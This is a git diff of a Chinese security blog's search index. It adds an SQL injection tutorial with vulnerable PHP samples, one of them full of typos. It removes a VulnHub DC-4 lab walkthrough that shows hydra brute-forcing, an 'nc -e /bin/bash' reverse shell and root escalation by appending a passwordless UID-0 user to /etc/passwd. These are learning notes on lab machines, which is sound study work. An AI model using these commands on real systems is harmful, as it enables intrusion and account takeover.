@@ -316,6 +316,54 @@
       </categories>
   </entry>
   <entry>
+    <title>SQL注入漏洞（一）</title>
+    <url>/2022/02/16/SQL1/</url>
+    <content><![CDATA[<h1>SQL 注入漏洞简介</h1>
+<h2 id="SQL-注入漏洞产生原因及危害">SQL 注入漏洞产生原因及危害</h2>
+<p>SQL 注入漏洞是指攻击者通过浏览器或者其他客户端将恶意 SQL 语句插入到网站参数中,而网站应用程序末对其进行过滤,将恶意 SQL语句带入数据库使恶意 SQL 语句得以执行,从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。<br>
+SQL 注入漏洞可能会造成服务器的数据库信息泄露、数据被窃取、网页被篡改,甚至可能会造成网站被挂马、服务器被远程控制、被安装后门等。</p>
+<h2 id="SQL-注入漏洞示例代码分析">SQL 注入漏洞示例代码分析</h2>
+<p>以下是 SQL 注入漏洞的示例代码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql-"SELECT * FROM users WHBRE id=$id LIMIT O,1";</span><br><span class="line">$result=mysql_query(fsql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
+<p>中间件通过 <code>$_GET['id']</code> 获取用户输入的 id 参数的值,并赋值给<code>$id</code> 这个变量。<code>$id</code> 在后面没有经过任何过滤,直接拼接到 SQL 语句中,然后在数据库中执行了此 SQL 语句。<br>
+如果用户提交 <code>index.php?id=1 and 1=1</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>，会有正常的结果返回。<br>
+如果用户提交 <code>index.php?id=1 and 1=2</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>，会有不正常的结果返回。</p>
+<h2 id="SQL注入分类">SQL注入分类</h2>
+<p>SQL注入按照数据类型分为<span class="p red">数字型注入</span>和<span class="p red">字符型注入</span>。注入点的数据类型为数字型时为数字型注入,注入点的数据类型为字符型时为字符型注入。<br>
+SQL注入按照服务器返回信息是否显示分为报错注入和盲注。如果在注入的过程中,程序将获取的信息或者报错信息直接显示在页面中,这样的注入为报错注入;如果在注入的过程中,程序不显示任何SQL报错信息,只能通过精心构造SQL语句,根据页面是否正常返回或者返回的时间判断注入的结果,这样的注入为盲注。</p>
+<h1>数字型注入</h1>
+<p>数字型注入就是注入点的数据类型是数字型,没有用单引号引起来。数字型注入的典型示例代码如下:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";    //$id没有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
+<p>在 <code>WHERE id=$id</code>这个SQL语句的子句中,<code>$id</code>变量没有用单引号或者双引号引起来,而是直接拼接到了后面,这样的注入就是典型的数字型注入。</p>
+<h2 id="判断数字型注入的方法如下">判断数字型注入的方法如下:</h2>
+<h3 id="输入单引号-不正常返回。">输入单引号,不正常返回。</h3>
+<p>如果用户提交 <code>index.php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
+<h3 id="输入and-1-1-正常返回。">输入<code>and 1=1</code>,正常返回。</h3>
+<p>如果用户提交 <code>index.php?id=1 and 1=1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>,会有正常的结果返回。</p>
+<h3 id="输入and-1-2-不正常返回">输入<code>and 1=2</code>,不正常返回</h3>
+<p>如果用户提交 <code>index.php?id=1 and 1=2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>,会有不正常的结果返回。<br>
+数字型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在数字型注入。具体有没有数字型注入,是否可以通过数字型注入获取有效信息,还需要大量的测试来验证。</p>
+<h1>字符型注入</h1>
+<p>字符型注入就是注入点的数据类型是字符型。字符型注入与数字型注入的区别就是字符型注入要用一对单引号引起来。字符型注入的典型示例代码如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";    //'$id'有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
+<p>这个示例代码与数字型注入的示例代码基本一致,只是在后面的SQL语句拼接中,<code>$id</code>多了一对单引号,<code>$id</code>是字符型数据,这就是典型的字符型注入。</p>
+<h2 id="判断字符型注入的方法如下">判断字符型注入的方法如下:</h2>
+<h3 id="输入单引号-不正常返回。-v2">输入单引号,不正常返回。</h3>
+<p>如果用户提交 <code>index,php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
+<h3 id="输入-and-1-1-正常返回">输入<code>'and'1'='1</code>,正常返回</h3>
+<p>如果用户提交 <code>index.php?id=1 'and' 1'='1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1</code>,会有正常的结果返回。</p>
+<h3 id="输入-and-1-2-不正常返回">输入<code>'and'1'='2</code>,不正常返回</h3>
+<p>如果用户提交 <code>index.php?id=1 'and' 1'='2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1</code>,会有不正常的结果返回。<br>
+字符型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在字符型注入。具体有没有字符型注入,是否可以通过字符型注入获取有效信息,还需要大量的测试来验证。</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>My Awesome Photoblog靶机学习记录</title>
     <url>/2022/08/08/Photoblog/</url>
     <content><![CDATA[<h1>关于靶机</h1>
@@ -495,6 +543,29 @@
       </tags>
   </entry>
   <entry>
+    <title>VulnHub——DC-1靶机学习记录</title>
+    <url>/2022/09/24/dc1/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="84e5950b4f6928370c633f0f1a1812ee8067963b5a6d847c60c774e437edb9fb">bed7a276ba7847d76277538a14c701d513208fcd9bec01ee5395d46614c8a8d77a7487d3838d985e6244ba9499c43727f0817a7c1d48622c8c2bfb7b6a8aba9bebac452a3380872edb394f4ce5260c0b543356768910e99ec6ced4db139df77114896906cb314cd3d31b36bd2e2976fdaf780288d9be00c3207d30101f1ba4c6f0247443ff05f8fa65f91ea64bda0236e442d53cd761dd272e7adda3365808d99fe2c4ce47eb10db32512dc5eaa5efc39976d5e25393539c4d229126208ff59e2f615950e2aefdd8cbc9f76f06e5e19194ad1b525da4b6b98b49926d2f2eadfdf5194511986954bdff328871779b0cc3cc29726bf67cd4edba7dd4255f4a85807fea077ae7864bd950ceae3e55754fb9e7c7ec1314910fb83de0555b86db174ef824a5f8bb31f5dca1526a2b87c71ec7552ee2315a43200aa81a2adb5c8b8e0f6e1eac168c661f47c022ba89ad53cfd7ad21bdf518191e7c4bfa96de18129935da0781be88c84f6e97ce0269827eab9d6a08637ec05b52fbb34b67fc559fff245868ab8078132a6a60992a6442e0b411797a40210b2a47780649dc235bb06738b3f985a16fc31899f08c61b8a28e3ad4f8ac24c49c6885a597ff0e19513152d799b8588e23bca1659877a692363826a0ec08eed5306ae1a75befa4238c00283cdb3ab6d0f4a271ed814c2717e922325c27289dccea8d3a40699f71da3d13ecd90f833910705db6f4839585c25f2249a9d659ca01ff137c03e4672114165e380f391272148d6a652204e71d1f0b4be43c9a0aeebacd4baf7605777c8db316d2b2d76b1948fb821ae5edc3a799142616788d1df1ae847432bb2fd382176d6f1d5d833568aeaea6461b5a2aa47cda200425f2de7944a898576a6603a880137e300b8a229734e593d710738521e8c66804853557ba6a6804b3f09a8633a590887abcf827d2f4e0b44c676a1f37404bcdd5d27bf550b5f78d29eb8718bb51f74577511cfd8ad9ad556af306e49195f2d49eaf474c027084376ce24c0caddf9b7d14d24b8c08651451e0732cf38d1635bb27dd7591a830a795dbf2df83a71e594e6d113cb3745ef89696c7b566af22b7c356cae5f5768f56ba5ee64760b5d820194656db02bc7602d9920025f8cc09d0a58480661a3acee7f6b80f2d9a6bfe08f14e4b69826177422737797526c8adc69efb376865edaa30243adf7a808f04f0d9e008a6f5ae66bdca6ea3f27f4ddc03c15c54920dc3043eb92c3a2c61f282adf2f3371786962eb6fa317f998e59182ce386737ddd634d5b1e2bbce14fdedf0dc993bb3f1f0662cdd85dfadcbb8e510b598493551c1666ead6699efaec42267c286db3b9c13a40dc945cf3371f8e628b13154db51e50af08449fcd2bc6357beda3a5d9ea1fcd964b14761300f8a7e07365a8f1fd1b23f1f48b80d46f3cc96c0645449bdf150b45cde74bccd47928c28ec0da119ed6a35f42915a1980ccf7f449b4adea3d87a6995258575efb74d816406b114a5c6ee74a6aec213cf578b51138512581c1f5dcfd0bd584177184baa719032caad013e56e4f4550e63fa14bd09efb530a3e2d44dfcf2a01bbe7585b26df429f07d06cd5132ba9f368a7c1d8c86e343a7c394da3e5a885d9eff6740587f2ee51a3653187f8b270e9c741e23bc7a8094fd5fffa926d4c3e4142e10dbab272a062b733587f2984abf0409bbf1dad8958db9a24cf882fc3080c67cc4ff86c2bd8d0772d1fb4c89380d193426d8f80779502ffc6df0baac10d0e36bc0cfcf17f2781e1f9e17f82125b219409448864574a51dcf9505985f9e8ba9512aa10badfcf5d0bf2f0439708ecbc93465ef6b7e11db5da201504ca9384141fad3901e25352412ad59cfbf9b6b37f9b87b10588f114e24dc32cdaa8f850ddbcc2566c2a6968e192414b5ef5a80a87c4e5771fbd4f1dd790cbd71eb743442760b677d7366d21907d868482e9bb246119ba4e9fb3f2259a164f27713e51a6f3de0064b5a2c0abb42d2bcc93ea64508b7d3f338e76a7b3431aa6f6c9f26939b42b4783d171d47c669db0f23af6f29607616b866fd32c1f7c4ff9d41ac03c2b8b4f54e93a03fcfc48effd84de5a09336edc589cfd8da472868f5a48ec8e70162f30b2f0e320f072ff84f8af21d6fb68f4e5be3f6d576d1132233451cc35755cefb2441fbf436b069bab7987882aba78f4e8f38da3ec658b972d495c658eec1dfe67dc1d58aabd05e4fe4e0208c66d27b89f5848db0c88c6cb8b64d701c35b0308ab841b1d4ba92a26cff3f4c038833a9d63e602f3518b2516fc753380fc845bb04db15e9e620fd5a6bd690369ddd1b58b22da1d78e6d56d8e89d763f8fd481649d5f90ab2bb497c7149</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-up">
+      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>IP地址详解</title>
     <url>/2022/03/17/cgrona1/</url>
     <content><![CDATA[<h1>0x01 IP（IPv4）</h1>
@@ -560,254 +631,6 @@
       <categories>
         <category>转载</category>
       </categories>
-  </entry>
-  <entry>
-    <title>VulnHub——DC-1靶机学习记录</title>
-    <url>/2022/09/24/dc1/</url>
-    <content><![CDATA[<h1>关于DC-1</h1>
-<blockquote>
-<p>DC-1是一个专门建造的易受攻击的实验室，目的是获得渗透测试领域的经验。</p>
-<p>它的设计对初学者来说是一个挑战，但它的容易程度将取决于你的技能和知识，以及你的学习能力。</p>
-<p>要成功完成此挑战，您需要Linux技能，熟悉Linux命令行并具有基本渗透测试工具的经验，例如可以在Kali Linux或鹦鹉安全操作系统上找到的工具。</p>
-<p>有多种方法可以获得root，但是，我提供了一些包含初学者线索的标志。</p>
-<p>总共有五个标志，但最终目标是在 root 的主目录中查找并读取该标志。您甚至不需要成为root才能执行此操作，但是，您将需要root权限。</p>
-<p>根据您的技能水平，您可以跳过查找大多数这些标志并直接进入root。</p>
-<p>初学者可能会遇到他们以前从未遇到过的挑战，但是Google搜索应该是获取完成此挑战所需的信息所需的全部内容。</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>DC- 1</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>发布日期</td>
-<td>2019年2月28日</td>
-</tr>
-<tr>
-<td>作者</td>
-<td>DCAU</td>
-</tr>
-<tr>
-<td>系列</td>
-<td>DC</td>
-</tr>
-<tr>
-<td>网页</td>
-<td><a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></td>
-</tr>
-</tbody>
-</table>
-<h1>环境</h1>
-<p>靶机：DC-1（IP:192.168.）</p>
-<p>攻击机：KALI（IP:192.168.3.96）</p>
-<p>平台：VMware 16.2.4</p>
-<h1>信息收集</h1>
-<p><strong>主机发现</strong></p>
-<p><code>arp-scan -l</code></p>
-<hr>
-<p>待更新</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VulnHub——DC-4靶机学习记录</title>
-    <url>/2022/07/25/dc4/</url>
-    <content><![CDATA[<h1>关于DC-4</h1>
-<blockquote>
-<p>DC-4是另一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。</p>
-<p>与以前的DC版本不同，此版本主要为初学者/中级版本而设计。只有一个标志，但从技术上讲，有多个入口点，就像上次一样，没有线索。</p>
-<p>Linux技能和对Linux命令行的熟悉程度是必须的，基本的渗透测试工具的一些经验也是必须的。</p>
-<p>对于初学者来说，Google可以提供很大的帮助，但你可以随时在@DCAU7上发推文给我，寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>DC- 4</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>发布日期</td>
-<td>2019年4月7日</td>
-</tr>
-<tr>
-<td>作者</td>
-<td>DCAU</td>
-</tr>
-<tr>
-<td>系列</td>
-<td>DC</td>
-</tr>
-<tr>
-<td>网页</td>
-<td><a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></td>
-</tr>
-</tbody>
-</table>
-<h1>环境</h1>
-<p>靶机：DC-4（IP:未知）</p>
-<p>攻击机：KALI（IP:192.168.3.96）</p>
-<p>平台：VMware 16.2.4</p>
-<h1>信息收集</h1>
-<p><strong>主机发现</strong></p>
-<p><code>arp-scan -l</code></p>
-<p><img src="https://img.anineg.space/scan1.png" alt="scan1"></p>
-<p><strong>使用nmap进行扫描主机</strong></p>
-<p><code>nmap -sS -Pn -A -p- -n 192.168.3.95</code></p>
-<p><img src="https://img.anineg.space/nmapss.png" alt="nmapss"></p>
-<p><code>nmap -sV -p- 192.168.3.95</code></p>
-<p><img src="https://img.anineg.space/nmapsv.png" alt="nmapsv"></p>
-<p><strong>web指纹识别</strong></p>
-<p><code>whatweb -v 192.168.3.95</code></p>
-<p><img src="https://img.anineg.space/whatweb.png" alt="whatweb"></p>
-<p><strong>网站目录扫描</strong></p>
-<p><code>dirb http://192.168.3.95 /usr/share/dirb/wordlists/big.txt</code></p>
-<p><img src="https://img.anineg.space/dirb.png" alt="dirb"></p>
-<h2 id="收集到的信息：">收集到的信息：</h2>
-<ul>
-<li>
-<p>靶机IP =&gt; 192.168.3.95</p>
-</li>
-<li>
-<p>开放的端口：</p>
-<ul>
-<li>22 =&gt; ssh服务 ---- OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</li>
-<li>80 =&gt; http服务 ---- nginx 1.15.10</li>
-</ul>
-<hr>
-</li>
-</ul>
-<h1>渗透测试</h1>
-<p>尝试用hydra进行爆破</p>
-<p><code>hydra -l root -P /root/top1000.txt -vV -t 10 -o ssh.txt 192.168.15.152 ssh -s 22</code></p>
-<p><img src="https://img.anineg.space/hydra1.png" alt="hydra1"></p>
-<p>爆不出来，先去网页端看一看有什么有用的信息。</p>
-<p>访问<code>http://192.168.3.95/</code></p>
-<p><img src="https://img.anineg.space/0010.png" alt="0010"></p>
-<p>打开网页，是一个登录界面，开始用BP进行爆破，得到密码：</p>
-<blockquote>
-<p>happy</p>
-</blockquote>
-<p><img src="https://img.anineg.space/baopo.png" alt="baopo"></p>
-<p>登录进入，发现有可以执行命令的地方：</p>
-<p><img src="https://img.anineg.space/login.png" alt="login"></p>
-<p><img src="https://img.anineg.space/run.png" alt="run"></p>
-<p>使用BP进行抓包，发现可以修改命令：</p>
-<p><img src="https://img.anineg.space/bp1.png" alt="bp1"></p>
-<p><img src="https://img.anineg.space/bp2.png" alt="bp2"></p>
-<p><img src="https://img.anineg.space/fire1.png" alt="fire1"></p>
-<p>先执行一个反弹shell的命令：<code>nc -e /bin/bash 192.168.3.95 4444</code></p>
-<p>执行之前现在kali上监听4444端口：<code>nc -lnvp 4444</code></p>
-<p><img src="https://img.anineg.space/listen.png" alt="listen"></p>
-<p><img src="https://img.anineg.space/bp4.png" alt="bp4"></p>
-<p>getshell成功：</p>
-<p><img src="https://img.anineg.space/ncsuccess.png" alt="ncsuccess"></p>
-<p>进入交互模式，便于操作：<code>python -c 'import pty;pty.spawn("/bin/sh")'</code></p>
-<p>先搜刮一下目录：</p>
-<p><img src="https://img.anineg.space/jim.png" alt="jim"></p>
-<p>查看jim用户下的backups，发现确实是密码的备份，cat打开进行查看，确实是密码。</p>
-<p><img src="https://img.anineg.space/bak.png" alt="bak"></p>
-<p>看看其他文件，mbox访问被拒绝：</p>
-<p><img src="https://img.anineg.space/catother.png" alt="catother"></p>
-<p>把密码copy到本地，用 hydra进行爆破：</p>
-<p><code>hydra -l jim -P /home/kali/桌面/bak.txt ssh://192.168.3.95</code></p>
-<p><img src="https://img.anineg.space/hydrasuccess.png" alt="hydrasuccess"></p>
-<p>得到密码：</p>
-<blockquote>
-<p>jibril04</p>
-</blockquote>
-<p>使用ssh远程登陆：</p>
-<p><img src="https://img.anineg.space/sshin1.jpg" alt="sshin1"></p>
-<p>注意系统提示有新的邮件。</p>
-<p>找到邮件，发现 charles用户交给 jim用户保管的密码：</p>
-<p><img src="https://img.anineg.space/cdmail.png" alt="cdmail"></p>
-<p><img src="https://img.anineg.space/jimmail.png" alt="jimmail"></p>
-<p>得到用户名和密码：</p>
-<blockquote>
-<p>charles</p>
-<p>^xHhA&amp;hvim0y</p>
-</blockquote>
-<p>再次使用ssh远程登陆到charles ：</p>
-<p><img src="https://img.anineg.space/sshin2.png" alt="sshin2"></p>
-<p>查看用户权限发现，该用户可以以root权限免密码执行 /usr/bin/teehee</p>
-<p>进行提权，直接向/etc/passwd中增加内容：</p>
-<p>echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</p>
-<p>添加一个 hack用户，并使用teehee执行写入passwd中</p>
-<p><code>echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</code></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line">admin:x:0:0::/home/admin:/bin/bash</span><br><span class="line">[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br><span class="line">"-a" 选项的作用等同于 "&gt;&gt;" 命令</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="https://img.anineg.space/image-20220725223345603.png" alt="image-20220725223345603"></p>
-<p>得到flag：<img src="https://img.anineg.space/flag.png" alt="flag"></p>
-<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
-              <div class="content">
-              <div class="tag link"><a class="link-card" title="菜鸟渗透日记24---DC-4靶机打靶过程详解" href="https://blog.csdn.net/leesir98/article/details/101620077"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">菜鸟渗透日记24---DC-4靶机打靶过程详解</p><p class="url">https://blog.csdn.net/leesir98/article/details/101620077</p></div></a></div><div class="tag link"><a class="link-card" title="DC-4靶机渗透指南（渗透测试详细操作）" href="https://blog.csdn.net/weixin_45671944/article/details/121747512"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">DC-4靶机渗透指南（渗透测试详细操作）</p><p class="url">https://blog.csdn.net/weixin_45671944/article/details/121747512</p></div></a></div><div class="tag link"><a class="link-card" title="【vulnhub】---DC-4靶机" href="https://blog.csdn.net/qq_43168364/article/details/106626917"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">【vulnhub】---DC-4靶机</p><p class="url">https://blog.csdn.net/qq_43168364/article/details/106626917</p></div></a></div>
-              </div>
-            </details>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入漏洞（一）</title>
-    <url>/2022/02/16/SQL1/</url>
-    <content><![CDATA[<h1>SQL 注入漏洞简介</h1>
-<h2 id="SQL-注入漏洞产生原因及危害">SQL 注入漏洞产生原因及危害</h2>
-<p>SQL 注入漏洞是指攻击者通过浏览器或者其他客户端将恶意 SQL 语句插入到网站参数中,而网站应用程序末对其进行过滤,将恶意 SQL语句带入数据库使恶意 SQL 语句得以执行,从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。<br>
-SQL 注入漏洞可能会造成服务器的数据库信息泄露、数据被窃取、网页被篡改,甚至可能会造成网站被挂马、服务器被远程控制、被安装后门等。</p>
-<h2 id="SQL-注入漏洞示例代码分析">SQL 注入漏洞示例代码分析</h2>
-<p>以下是 SQL 注入漏洞的示例代码：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql-"SELECT * FROM users WHBRE id=$id LIMIT O,1";</span><br><span class="line">$result=mysql_query(fsql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
-<p>中间件通过 <code>$_GET['id']</code> 获取用户输入的 id 参数的值,并赋值给<code>$id</code> 这个变量。<code>$id</code> 在后面没有经过任何过滤,直接拼接到 SQL 语句中,然后在数据库中执行了此 SQL 语句。<br>
-如果用户提交 <code>index.php?id=1 and 1=1</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>，会有正常的结果返回。<br>
-如果用户提交 <code>index.php?id=1 and 1=2</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>，会有不正常的结果返回。</p>
-<h2 id="SQL注入分类">SQL注入分类</h2>
-<p>SQL注入按照数据类型分为<span class="p red">数字型注入</span>和<span class="p red">字符型注入</span>。注入点的数据类型为数字型时为数字型注入,注入点的数据类型为字符型时为字符型注入。<br>
-SQL注入按照服务器返回信息是否显示分为报错注入和盲注。如果在注入的过程中,程序将获取的信息或者报错信息直接显示在页面中,这样的注入为报错注入;如果在注入的过程中,程序不显示任何SQL报错信息,只能通过精心构造SQL语句,根据页面是否正常返回或者返回的时间判断注入的结果,这样的注入为盲注。</p>
-<h1>数字型注入</h1>
-<p>数字型注入就是注入点的数据类型是数字型,没有用单引号引起来。数字型注入的典型示例代码如下:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";    //$id没有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
-<p>在 <code>WHERE id=$id</code>这个SQL语句的子句中,<code>$id</code>变量没有用单引号或者双引号引起来,而是直接拼接到了后面,这样的注入就是典型的数字型注入。</p>
-<h2 id="判断数字型注入的方法如下">判断数字型注入的方法如下:</h2>
-<h3 id="输入单引号-不正常返回。">输入单引号,不正常返回。</h3>
-<p>如果用户提交 <code>index.php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
-<h3 id="输入and-1-1-正常返回。">输入<code>and 1=1</code>,正常返回。</h3>
-<p>如果用户提交 <code>index.php?id=1 and 1=1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>,会有正常的结果返回。</p>
-<h3 id="输入and-1-2-不正常返回">输入<code>and 1=2</code>,不正常返回</h3>
-<p>如果用户提交 <code>index.php?id=1 and 1=2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>,会有不正常的结果返回。<br>
-数字型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在数字型注入。具体有没有数字型注入,是否可以通过数字型注入获取有效信息,还需要大量的测试来验证。</p>
-<h1>字符型注入</h1>
-<p>字符型注入就是注入点的数据类型是字符型。字符型注入与数字型注入的区别就是字符型注入要用一对单引号引起来。字符型注入的典型示例代码如下：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";    //'$id'有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
-<p>这个示例代码与数字型注入的示例代码基本一致,只是在后面的SQL语句拼接中,<code>$id</code>多了一对单引号,<code>$id</code>是字符型数据,这就是典型的字符型注入。</p>
-<h2 id="判断字符型注入的方法如下">判断字符型注入的方法如下:</h2>
-<h3 id="输入单引号-不正常返回。-v2">输入单引号,不正常返回。</h3>
-<p>如果用户提交 <code>index,php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
-<h3 id="输入-and-1-1-正常返回">输入<code>'and'1'='1</code>,正常返回</h3>
-<p>如果用户提交 <code>index.php?id=1 'and' 1'='1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1</code>,会有正常的结果返回。</p>
-<h3 id="输入-and-1-2-不正常返回">输入<code>'and'1'='2</code>,不正常返回</h3>
-<p>如果用户提交 <code>index.php?id=1 'and' 1'='2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1</code>,会有不正常的结果返回。<br>
-字符型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在字符型注入。具体有没有字符型注入,是否可以通过字符型注入获取有效信息,还需要大量的测试来验证。</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
   </entry>
   <entry>
     <title>永恒之蓝漏洞复现</title>
@@ -1164,51 +987,6 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </tags>
   </entry>
   <entry>
-    <title>TCP协议传输数据还原测试</title>
-    <url>/2022/10/04/tcptest/</url>
-    <content><![CDATA[<details class="folding-tag" yellow=""><summary> 相关原理： </summary>
-              <div class="content">
-              <p>TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个TCP连接必须要经过三次“对话”才能建立起来，其中的过程非常复杂，我们这里只做简单、形象的介绍，你只要做到能够理解这个过程即可。我们来看看这三次对话的简单过程：主机A向主机B发出连接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；主机B向主机A发送同意连接和要求同步（同步就是两台主机一个在发送，一个在接收，协调工作）的数据包：“可以，你什么时候发？”，这是第二次对话；主机A再发出一个数据包确认主机B的要求同步：“我现在就发，你接着吧！”，这是第三次对话。三次“对话”的目的是使数据包的发送和接收同步，经过三次“对话”之后，主机A才向主机B正式发送数据。</p><p>QQ的文件发送是怎样的过程呢？通常，发送文件的计算机首先要通过消息服务器将其IP地址发送给接收计算机，当接收计算机同意接收的确认消息反馈到消息服务器后，消息服务器将据此设置好文件传输对话。随即，发送计算机与接收计算机就会在确定好的端口范围内，建立起TCP或UDP连接开始文件的检索与传输。</p><p>在默认状态下，QQ优先采用了UDP（User Data Protocol，用户数据报协议）协议传送数据，而对可靠性要求高的数据通讯系统往往使用TCP协议传输数据。与TCP协议不同，UDP协议并不提供数据传送的验证机制——在整个文件传输过程中如果出现数据报的丢失，协议本身并不能作出任何的检测或提示。因此，通常人们把UDP协议称为不可靠的传输协议。 